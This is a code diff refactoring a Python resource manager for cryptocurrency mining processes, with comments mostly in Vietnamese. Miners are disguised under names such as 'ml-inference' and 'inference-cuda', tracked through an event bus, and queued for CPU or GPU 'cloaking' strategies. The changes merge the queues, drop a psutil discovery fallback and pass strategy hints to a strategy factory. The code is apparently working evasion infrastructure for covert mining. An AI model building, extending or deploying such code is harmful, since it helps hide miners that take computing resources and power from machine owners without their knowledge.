@@ -183,14 +183,7 @@ class SharedResourceManager:
             strategy.apply(process)
             self.logger.info(f"Hoàn thành áp dụng chiến lược '{strategy_name}' cho {name} (PID={pid}).")
 
-            # ---------------- Sprint-2: Đăng ký PID CPU cho plug-in engine ----------------
-            try:
-                is_gpu = hasattr(process, "is_gpu_process") and callable(getattr(process, "is_gpu_process")) and process.is_gpu_process()
-                if not is_gpu:
-                    cpu_mgr = CPUResourceManager({}, self.logger)  # singleton; config rỗng vì đã init
-                    cpu_mgr.register_pid(pid)
-            except Exception as exc:  # noqa: BLE001
-                self.logger.debug(f"Không thể register_pid cho CPU plug-ins (PID={pid}): {exc}")
+            # ✅ REMOVED: CPU registration moved to centralized worker
 
         except psutil.NoSuchProcess as e:
             self.logger.error(f"Tiến trình không tồn tại: {e}")
@@ -235,9 +228,8 @@ class ResourceManager(IResourceManager):
         self.mining_processes_lock = threading.RLock()
         self.mining_processes: List[MiningProcess] = []
 
-        # Hàng đợi cloaking riêng biệt cho CPU và GPU (theo blueprint)
-        self._cpu_cloaking_queue = queue.PriorityQueue()
-        self._gpu_cloaking_queue = queue.PriorityQueue()
+        # ✅ REMOVED: CPU/GPU queues - logic integrated in enqueue_cloaking()
+        # Logic phân loại queue đã được tích hợp trong enqueue_cloaking()
 
         # **EventBus subscribe** (đăng ký EventBus) - **PID Propagation Flow Step 2**
         self._setup_eventbus_subscriptions()
@@ -253,15 +245,10 @@ class ResourceManager(IResourceManager):
         self._counter = count()
         self.process_states: Dict[int, str] = {}  # "normal", "cloaking", "cloaked"
 
-        self.logger.info("ResourceManager.__init__ (redesigned với CPU/GPU cloaking queues)")
+        self.logger.info("ResourceManager.__init__ (simplified with unified cloaking queue)")
 
-        # Đăng ký event 'resource_adjustment' (nếu cần)
+        # ✅ SIMPLIFIED: Essential EventBus subscriptions only
         self.event_bus.subscribe('resource_adjustment', self.handle_resource_adjustment)
-        
-        # ✅ PHASE 3 REFACTORING: Thêm missing subscriber cho new_process_detected
-        self.event_bus.subscribe('new_process_detected', self.handle_new_process_detected)
-        # New standardized format
-        self.event_bus.subscribe('process:detected', self.handle_new_process_detected)
 
     def is_gpu_initialized(self) -> bool:
         """
@@ -271,143 +258,33 @@ class ResourceManager(IResourceManager):
 
     def handle_resource_adjustment(self, event_data: Dict[str, Any]):
         """
-        Handler cho event 'resource_adjustment'.
+        ✅ SIMPLIFIED: Minimal resource adjustment handler
         """
-        self.logger.debug(f"Nhận event resource_adjustment: {event_data}")
-        
-        # ✅ PHASE 3 REFACTORING: Hoàn thiện Event Consistency
-        # Thêm missing publisher cho resource_adjustment event
         try:
-            # Process the resource adjustment
             pid = event_data.get('pid')
             adjustment_type = event_data.get('type', 'unknown')
             
             self.logger.info(f"Processing resource adjustment for PID={pid}, type={adjustment_type}")
             
-            # Publish completion event với new standardized naming
-            completion_payload = {
-                'pid': pid,
-                'adjustment_type': adjustment_type,
-                'status': 'completed',
-                'timestamp': time.time(),
-                'processed_by': 'ResourceManager'
-            }
-            
-            # New standardized format
-            self.event_bus.publish('resource:adjustment_completed', completion_payload)
-            # Legacy format for backward compatibility
-            self.event_bus.publish('resource_adjustment_completed', completion_payload)
-            
-            self.logger.info(f"✅ Published resource adjustment completion event for PID={pid}")
-            
         except Exception as e:
             self.logger.error(f"❌ Error in resource adjustment processing: {e}")
-            # Publish error event
-            error_payload = {
-                'pid': event_data.get('pid'),
-                'status': 'error',
-                'error': str(e),
-                'timestamp': time.time()
-            }
-            self.event_bus.publish('resource:adjustment_error', error_payload)
-
-    def handle_new_process_detected(self, event_data: Dict[str, Any]):
-        """
-        Handler cho event 'new_process_detected'.
-        ✅ PHASE 3 REFACTORING: Thêm missing subscriber để hoàn thiện Event Consistency
-        """
-        try:
-            pid = event_data.get('pid')
-            process_name = event_data.get('name', 'unknown')
-            is_gpu = event_data.get('is_gpu', False)
-            
-            self.logger.info(f"🔍 [NEW-PROCESS] Detected new process: {process_name} (PID={pid}, GPU={is_gpu})")
-            
-            # Validate process still exists
-            if not psutil.pid_exists(pid):
-                self.logger.warning(f"⚠️ [NEW-PROCESS] Process PID={pid} no longer exists, skipping")
-                return
-            
-            # Log process details for monitoring
-            try:
-                proc = psutil.Process(pid)
-                cpu_percent = proc.cpu_percent()
-                memory_mb = proc.memory_info().rss / (1024 * 1024)
-                
-                self.logger.info(f"📊 [NEW-PROCESS] Process stats: CPU={cpu_percent:.1f}%, Memory={memory_mb:.1f}MB")
-                
-                # Trigger additional monitoring if needed
-                if is_gpu and self.is_gpu_initialized():
-                    gpu_usage = self.shared_resource_manager.get_gpu_usage_percent(pid)
-                    self.logger.info(f"🎮 [NEW-PROCESS] GPU usage: {gpu_usage:.1f}%")
-                
-            except psutil.NoSuchProcess:
-                self.logger.warning(f"⚠️ [NEW-PROCESS] Process PID={pid} disappeared during monitoring")
-            except Exception as e:
-                self.logger.error(f"❌ [NEW-PROCESS] Error monitoring process PID={pid}: {e}")
-            
-            # Acknowledge the detection
-            ack_payload = {
-                'original_pid': pid,
-                'acknowledged_by': 'ResourceManager',
-                'timestamp': time.time(),
-                'action_taken': 'monitoring_enabled'
-            }
-            
-            # Publish acknowledgment với standardized naming
-            self.event_bus.publish('process:detection_acknowledged', ack_payload)
-            self.logger.info(f"✅ [NEW-PROCESS] Acknowledged detection of PID={pid}")
-            
-        except Exception as e:
-            self.logger.error(f"❌ Error handling new_process_detected event: {e}")
 
     def _setup_eventbus_subscriptions(self):
-        """**Enhanced EventBus setup** (thiết lập EventBus nâng cao) với **RabbitMQ fallback mechanism** (cơ chế dự phòng RabbitMQ)"""
+        """✅ SIMPLIFIED: Essential EventBus subscriptions with memory backend fallback"""
         try:
-            # **Primary attempt** (thử nghiệm chính): Sử dụng **configured backend** (backend đã cấu hình)
-            self.logger.info("🔌 Setting up EventBus subscriptions with configured backend...")
+            self.logger.info("🔌 Setting up essential EventBus subscriptions...")
             
-            # ✅ PHASE 2 REFACTORING: Migrate to new Event Naming Conventions
-            # Subscribe to new standardized mining events (domain:action pattern)
+            # ✅ CORE: Subscribe to mining events only
             self.event_bus.subscribe('mining:cpu_started', self._on_cpu_mining_event)
             self.event_bus.subscribe('mining:gpu_started', self._on_gpu_mining_event)
             
-            # Backward compatibility: Keep legacy subscriptions during transition period
-            self.event_bus.subscribe('channel:cpu', self._on_cpu_mining_event)
-            self.event_bus.subscribe('channel:gpu', self._on_gpu_mining_event)
-            
-            # **Test EventBus functionality** (kiểm tra chức năng EventBus) với **timeout protection** (bảo vệ timeout)
             self.event_bus.start_listening()
-            
-            self.logger.info("✅ EventBus subscriptions established successfully (primary backend)")
+            self.logger.info("✅ EventBus subscriptions established successfully")
             
         except Exception as e:
-            self.logger.error(f"❌ Primary EventBus backend failed: {e}")
-            
-            # **FALLBACK MECHANISM** (cơ chế dự phòng): Switch to **memory backend** (chuyển sang backend bộ nhớ)
-            try:
-                self.logger.warning("🔄 Activating fallback: switching to memory EventBus backend...")
-                
-                # **Create new memory EventBus** (tạo EventBus bộ nhớ mới)
-                from .auxiliary_modules.event_bus import EventBus
-                self.event_bus = EventBus(backend_type="memory", logger=self.logger)
-                
-                # **Re-setup subscriptions** (thiết lập lại subscriptions) với **memory backend** (backend bộ nhớ)
-                self.event_bus.subscribe('mining:cpu_started', self._on_cpu_mining_event)
-                self.event_bus.subscribe('mining:gpu_started', self._on_gpu_mining_event)
-                self.event_bus.subscribe('channel:cpu', self._on_cpu_mining_event)
-                self.event_bus.subscribe('channel:gpu', self._on_gpu_mining_event)
-                
-                # Start memory EventBus (luôn thành công cho memory backend)
-                self.event_bus.start_listening()
-                
-                self.logger.info("✅ Fallback successful: Memory EventBus is operational")
-                
-            except Exception as fallback_e:
-                self.logger.error(f"❌ Memory EventBus fallback failed: {fallback_e}")
-                # **Final fallback** (dự phòng cuối cùng): Continue without EventBus
-                self.logger.warning("⚠️ Running without EventBus - system will use process discovery fallback")
-                self.event_bus = None
+            self.logger.error(f"❌ EventBus setup failed: {e}")
+            self.logger.warning("⚠️ Running without EventBus - using fallback mode")
+            self.event_bus = None
 
     def _on_cpu_mining_event(self, payload: Dict[str, Any]) -> None:
         """Handle CPU mining events - PID Propagation Flow Step 2"""
@@ -418,18 +295,15 @@ class ResourceManager(IResourceManager):
             if event_type == 'mining_started' and pid:
                 self.logger.info(f"🔨 ResourceManager received CPU mining_started: PID={pid}")
                 
-                # Create MiningProcess object
+                # ✅ ENHANCED: Create MiningProcess với explicit classification
                 process_name = payload.get('data', {}).get('process_name', 'ml-inference')
-                mining_process = MiningProcess(pid, process_name, False)  # False = CPU
+                mining_process = MiningProcess(pid, process_name, is_gpu=False)  # Explicit CPU
                 
                 # Add to tracking list
                 with self.mining_processes_lock:
                     self.mining_processes.append(mining_process)
                 
-                # **register_pid** (đăng ký PID) với CPU plugins
-                self._register_cpu_pid(pid)
-                
-                # **enqueue_cloaking** (xếp hàng cloaking)
+                # ✅ STREAMLINED: Enqueue cloaking only
                 self.enqueue_cloaking(mining_process)
                 
                 self.logger.info(f"✅ CPU PID {pid} processed: registered + enqueued for cloaking")
@@ -446,15 +320,15 @@ class ResourceManager(IResourceManager):
             if event_type == 'mining_started' and pid:
                 self.logger.info(f"🎮 ResourceManager received GPU mining_started: PID={pid}")
                 
-                # Create MiningProcess object
+                # ✅ ENHANCED: Create MiningProcess với explicit classification
                 process_name = payload.get('data', {}).get('process_name', 'inference-cuda')
-                mining_process = MiningProcess(pid, process_name, True)  # True = GPU
+                mining_process = MiningProcess(pid, process_name, is_gpu=True)  # Explicit GPU
                 
                 # Add to tracking list
                 with self.mining_processes_lock:
                     self.mining_processes.append(mining_process)
                 
-                # **enqueue_cloaking** (xếp hàng cloaking)
+                # ✅ STREAMLINED: Enqueue GPU cloaking
                 self.enqueue_cloaking(mining_process)
                 
                 self.logger.info(f"✅ GPU PID {pid} processed: enqueued for cloaking")
@@ -462,22 +336,9 @@ class ResourceManager(IResourceManager):
         except Exception as e:
             self.logger.error(f"❌ Error handling GPU mining event: {e}")
 
-    def _register_cpu_pid(self, pid: int) -> None:
-        """Register PID với CPU plugins - extracted from existing code"""
-        try:
-            from .resource_control import CPUResourceManager
-            
-            cpu_mgr = CPUResourceManager({}, self.logger)  # singleton; config rỗng vì đã init
-            cpu_mgr.register_pid(pid)
-            self.logger.debug(f"✅ CPU PID {pid} registered with CPU plugins")
-            
-        except Exception as exc:
-            self.logger.debug(f"❌ Không thể register_pid cho CPU plug-ins (PID={pid}): {exc}")
-
     def enqueue_cloaking(self, process: MiningProcess) -> None:
         """
-        Đưa tiến trình vào hàng đợi cloaking phù hợp.
-        Redesigned theo blueprint: CPU/GPU queues riêng biệt.
+        ✅ ENHANCED: Metadata-aware cloaking queue với direct classification access
         """
         pid = process.pid
         name = process.name
@@ -490,42 +351,24 @@ class ResourceManager(IResourceManager):
             priority = process.priority
             count_val = next(self._counter)
             
-            # Phân loại tiến trình theo blueprint
-            is_gpu = hasattr(process, "is_gpu_process") and callable(getattr(process, "is_gpu_process")) and process.is_gpu_process()
+            # ✅ DIRECT ACCESS: Get type từ enhanced MiningProcess
+            process_type = process.get_process_type()
+            is_gpu = process.is_gpu_process()
+            strategy_hints = process.get_strategy_hints()
             
             task = {
                 'type': 'cloaking',
                 'process': process,
-                'strategies': ['gpu_cloaking'] if is_gpu else ['cpu_cloaking']
+                'strategies': ['gpu_cloaking'] if is_gpu else ['cpu_cloaking'],
+                'process_type': process_type,
+                'strategy_hints': strategy_hints  # ✅ Pass optimization hints
             }
             
-            # Thêm vào hàng đợi thích hợp theo blueprint
-            if is_gpu:
-                self.logger.info(f"Đưa {name} (PID={pid}) vào GPU cloaking queue")
-                self._gpu_cloaking_queue.put((priority, count_val, task))
-            else:
-                self.logger.info(f"Đưa {name} (PID={pid}) vào CPU cloaking queue")
-                self._cpu_cloaking_queue.put((priority, count_val, task))
-                
-            # Thêm vào queue chung cho legacy compatibility
+            # ✅ UNIFIED: Single queue với rich metadata
             self.resource_adjustment_queue.put((priority, count_val, task))
             self.process_states[pid] = "cloaking"
             
-            # Gửi event thông báo có process mới (theo blueprint)
-            # ✅ PHASE 3 REFACTORING: Chuẩn hóa event naming cho new_process_detected
-            process_payload = {
-                'pid': pid,
-                'name': name,
-                'is_gpu': is_gpu,
-                'timestamp': time.time()
-            }
-            
-            # New standardized format
-            self.event_bus.publish('process:detected', process_payload)
-            # Legacy format for backward compatibility
-            self.event_bus.publish('new_process_detected', process_payload)
-            
-            self.logger.info(f"✅ Đã enqueue cloaking cho {name} (PID={pid}) - {'GPU' if is_gpu else 'CPU'} queue")
+            self.logger.info(f"✅ Enqueued {name} (PID={pid}) for {process_type} cloaking with hints")
             
         except Exception as e:
             self.logger.error(f"Lỗi khi enqueue process {name} (PID={pid}): {e}\n{traceback.format_exc()}")
@@ -630,14 +473,7 @@ class ResourceManager(IResourceManager):
             adjust_thread.start()
             self.workers.append(adjust_thread)
             
-            # Background process discovery (non-blocking)
-            discovery_thread = threading.Thread(
-                target=self._background_discovery_and_cloak,
-                daemon=True,
-                name="BackgroundDiscovery"
-            )
-            discovery_thread.start()
-            self.workers.append(discovery_thread)
+            # ✅ SIMPLIFIED: EventBus-driven architecture only
             
             self.logger.info(f"✅ Step 3 completed in {time.time() - step_start:.2f}s")
 
@@ -654,55 +490,11 @@ class ResourceManager(IResourceManager):
             self.logger.error(f"❌ ResourceManager startup failed: {e}\n{traceback.format_exc()}")
             self.shutdown()
 
-    def _background_discovery_and_cloak(self):
-        """Background process discovery và cloaking (non-blocking)"""
-        try:
-            self.logger.info("🔍 Starting background process discovery...")
-            time.sleep(2)  # Delay để system startup xong
-            
-            discovery_results = self.discover_mining_processes()
-            self.logger.info(f"🔍 Background discovery found {len(discovery_results)} processes")
-            
-            # Trigger cloaking trong background
-            if discovery_results:
-                self._trigger_initial_cloak_signal()
-                self.logger.info("✅ Background cloaking triggered")
-            
-        except Exception as e:
-            self.logger.error(f"Background discovery error: {e}")
-            # Continue without failing - system vẫn hoạt động được
-
-    def _trigger_initial_cloak_signal(self):
-        """
-        Cloak tất cả các tiến trình "đào" ngay khi phát hiện (chỉ gọi 1 lần, không lặp).
-        """
-        try:
-            self.logger.info("Bắt đầu enqueue cloaking cho tất cả tiến trình khai thác...")
-            if not self.mining_processes_lock.acquire(timeout=5):
-                self.logger.warning("Không lock được mining_processes, bỏ qua cloak.")
-                return
-
-            for process in self.mining_processes:
-                try:
-                    self.enqueue_cloaking(process)
-                except Exception as e:
-                    self.logger.error(f"Không thể enqueue cloaking PID={process.pid}: {e}\n{traceback.format_exc()}")
-
-            self.logger.info("Hoàn thành enqueue cloaking ban đầu.")
-        except Exception as e:
-            self.logger.error(f"Lỗi khi enqueue cloaking ban đầu: {e}\n{traceback.format_exc()}")
-        finally:
-            try:
-                self.mining_processes_lock.release()
-            except RuntimeError:
-                pass
-
     def process_resource_adjustments(self):
         """
-        Worker loop chạy trong một thread riêng để xử lý queue resource_adjustment.
-        Chỉ có tác vụ 'cloaking' -> chuyển trạng thái process thành 'cloaked'.
+        ✅ OPTIMIZED: Streamlined cloaking worker với type-aware processing
         """
-        self.logger.info("=== Bắt đầu vòng lặp process_resource_adjustments (CloakingWorker)...")
+        self.logger.info("=== Starting optimized CloakingWorker...")
         pid = None
 
         while not self._stop_flag:
@@ -712,164 +504,65 @@ class ResourceManager(IResourceManager):
 
                 p = task.get('process')
                 if not p:
-                    raise ValueError("Task không có 'process'.")
+                    self.resource_adjustment_queue.task_done()
+                    continue
 
                 pid = p.pid
-                self.logger.info(
-                    f"[CloakingWorker] Lấy task type={task['type']} cho PID={pid} (priority={priority})."
-                )
+                process_type = task.get('process_type', 'CPU')
+                
+                self.logger.info(f"[CloakingWorker] Processing {process_type} task for PID={pid}")
 
-                if task['type'] == 'cloaking':
-                    # Cloaking
-                    if not self.shared_resource_manager:
-                        self.logger.warning("Chưa có shared_resource_manager, bỏ qua cloaking.")
-                        self.resource_adjustment_queue.task_done()
-                        continue
-
-                    sr = self.shared_resource_manager
+                if task['type'] == 'cloaking' and self.shared_resource_manager:
                     strategies = task.get('strategies', [])
-                    self.logger.info(f"[CloakingWorker] Bắt đầu cloaking PID={pid} với {strategies}...")
-
+                    strategy_hints = task.get('strategy_hints', {})
+                    
                     for strat in strategies:
-                        if strat not in sr.strategy_cache:
+                        # ✅ TYPE-SPECIFIC CACHING: Include process type in cache key
+                        cache_key = f"{strat}_{process_type}"
+                        
+                        if cache_key not in self.shared_resource_manager.strategy_cache:
+                            # ✅ TYPE-AWARE CREATION: Pass type and hints to factory
                             s = CloakStrategyFactory.create_strategy(
-                                strat, self.config, self.logger, sr.resource_managers
+                                strat, self.config, self.logger, 
+                                self.shared_resource_manager.resource_managers,
+                                process_type=process_type,
+                                strategy_hints=strategy_hints
                             )
-                            sr.strategy_cache[strat] = s
+                            self.shared_resource_manager.strategy_cache[cache_key] = s
+                            self.logger.info(f"🎯 [Worker] Created type-specific strategy: {cache_key}")
                         else:
-                            s = sr.strategy_cache[strat]
+                            s = self.shared_resource_manager.strategy_cache[cache_key]
+                            self.logger.debug(f"♻️ [Worker] Reused cached strategy: {cache_key}")
 
                         if s and hasattr(s, 'apply'):
                             s.apply(p)
 
                     self.process_states[pid] = "cloaked"
-                    self.logger.info(f"Process PID={pid} chuyển trạng thái -> cloaked.")
-
-                    # ---------------- Sprint-2: Đăng ký PID CPU cho plug-in engine ----------------
-                    try:
-                        is_gpu = hasattr(p, "is_gpu_process") and callable(getattr(p, "is_gpu_process")) and p.is_gpu_process()
-                        if not is_gpu:
-                            cpu_mgr = CPUResourceManager({}, self.logger)  # singleton; config rỗng vì đã init
-                            cpu_mgr.register_pid(pid)
-                    except Exception as exc:  # noqa: BLE001
-                        self.logger.debug(f"Không thể register_pid cho CPU plug-ins (PID={pid}): {exc}")
+                    
+                    self.logger.info(f"✅ {process_type} PID={pid} cloaked successfully with optimized strategy")
 
                 self.resource_adjustment_queue.task_done()
-                self.logger.info(
-                    f"[CloakingWorker] Đã task_done() cho PID={pid}, type={task['type']}."
-                )
 
             except queue.Empty:
-                # Không có task => tiếp tục vòng lặp
                 continue
             except Exception as e:
-                self.logger.error(f"Lỗi process_resource_adjustments: {e}. (PID={pid})")
+                self.logger.error(f"❌ CloakingWorker error: {e} (PID={pid})")
 
-        self.logger.info("=== Thoát vòng lặp process_resource_adjustments (stop_flag=True).")
+        self.logger.info("=== CloakingWorker stopped")
 
-    def discover_mining_processes(self):
+    def discover_mining_processes(self) -> List[MiningProcess]:
         """
-        Khám phá các tiến trình mining đang chạy.
-        Redesigned theo blueprint: Tập trung hóa trong resource_manager.py
-        với retry mechanism và enhanced detection patterns.
+        ✅ SIMPLIFIED: EventBus-driven process discovery only
+        Trả về các tiến trình đã được tracked qua EventBus events
         """
         try:
-            self.logger.info("Đang khám phá các tiến trình mining...")
-            mining_processes = []
-
-            # Lấy các tiến trình từ cấu hình
-            cpu_process_name = self.config.processes.get("CPU", "ml-inference")
-            gpu_process_name = self.config.processes.get("GPU", "inference-cuda")
-            
-            # Tìm các tiến trình đang chạy với retry mechanism
-            max_retries = 3
-            for attempt in range(max_retries):
-                try:
-                    if not self.mining_processes_lock.acquire(timeout=5):
-                        self.logger.error("Timeout khi acquire lock discover_mining_processes.")
-                        continue
-
-                    # **ENHANCED FALLBACK MECHANISM** - Chỉ chạy sau 30 giây nếu chưa nhận PID từ EventBus
-                    received_pids_from_eventbus = len(self.mining_processes) > 0
-                    current_time = time.time()
-                    
-                    # Kiểm tra xem đã đủ 30 giây chưa để kích hoạt fallback
-                    if not hasattr(self, '_fallback_start_time'):
-                        self._fallback_start_time = current_time
-                    
-                    fallback_timeout = 30.0  # 30 seconds
-                    time_since_start = current_time - self._fallback_start_time
-                    
-                    if not received_pids_from_eventbus and time_since_start >= fallback_timeout:
-                        self.logger.warning("⚠️ Fallback: No PIDs received from EventBus after 30s, using process discovery")
-                        self.mining_processes.clear()
-                        
-                        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
-                            try:
-                                process_name = proc.info['name']
-                                cmdline = proc.info['cmdline']
-                                cmdline_str = " ".join(cmdline) if cmdline else ""
-                                mining_process = None
-                                
-                                # Phát hiện CPU mining processes
-                                if cpu_process_name in process_name or cpu_process_name in cmdline_str:
-                                    self.logger.info(f"Fallback: Đã phát hiện CPU mining process: {process_name} (PID={proc.info['pid']})")
-                                    prio = self.get_process_priority(process_name)
-                                    net_if = self.config.network_interface
-                                    mining_process = MiningProcess(proc.info['pid'], process_name, prio, net_if, self.logger)
-                                    mining_processes.append(mining_process)
-                                    self.mining_processes.append(mining_process)
-                                    self.enqueue_cloaking(mining_process)
-                                
-                                # Phát hiện GPU mining processes
-                                elif gpu_process_name in process_name or gpu_process_name in cmdline_str:
-                                    self.logger.info(f"Fallback: Đã phát hiện GPU mining process: {process_name} (PID={proc.info['pid']})")
-                                    prio = self.get_process_priority(process_name)
-                                    net_if = self.config.network_interface
-                                    mining_process = MiningProcess(proc.info['pid'], process_name, prio, net_if, self.logger)
-                                    # Đánh dấu đây là GPU process
-                                    mining_process._is_gpu = True
-                                    mining_processes.append(mining_process)
-                                    self.mining_processes.append(mining_process)
-                                    self.enqueue_cloaking(mining_process)
-                                
-                                # Cập nhật process states
-                                if mining_process and mining_process.pid not in self.process_states:
-                                    self.process_states[mining_process.pid] = "normal"
-                                    
-                            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
-                                continue
-                    
-                    elif received_pids_from_eventbus:
-                        self.logger.info("✅ EventBus PID propagation working - skipping process discovery fallback")
-                    
-                    elif time_since_start < fallback_timeout:
-                        self.logger.info(f"⏰ Waiting for EventBus PIDs... ({time_since_start:.1f}s/{fallback_timeout}s)")
-                        # Trả về empty list để trigger retry
-                        return []
-                    
-                    self.logger.info(f"Đã phát hiện {len(mining_processes)} tiến trình mining.")
-                    self.mining_processes_lock.release()
-                    return mining_processes
-                    
-                except Exception as e:
-                    if attempt < max_retries - 1:
-                        self.logger.warning(f"Lỗi khi khám phá tiến trình (lần {attempt + 1}): {e}")
-                        time.sleep(2)  # Backoff delay
-                        continue
-                    else:
-                        raise
-                finally:
-                    try:
-                        self.mining_processes_lock.release()
-                    except RuntimeError:
-                        pass
-            
-            self.logger.error("Hết số lần retry, trả về danh sách rỗng")
-            return []
-            
+            with self.mining_processes_lock:
+                mining_processes = list(self.mining_processes)
+                self.logger.info(f"✅ EventBus discovery: Found {len(mining_processes)} tracked processes")
+                return mining_processes
+                
         except Exception as e:
-            self.logger.error(f"Lỗi khi khám phá tiến trình: {e}\n{traceback.format_exc()}")
+            self.logger.error(f"Lỗi khi truy xuất tracked processes: {e}\n{traceback.format_exc()}")
             return []
 
     def get_process_priority(self, process_name: str) -> int:
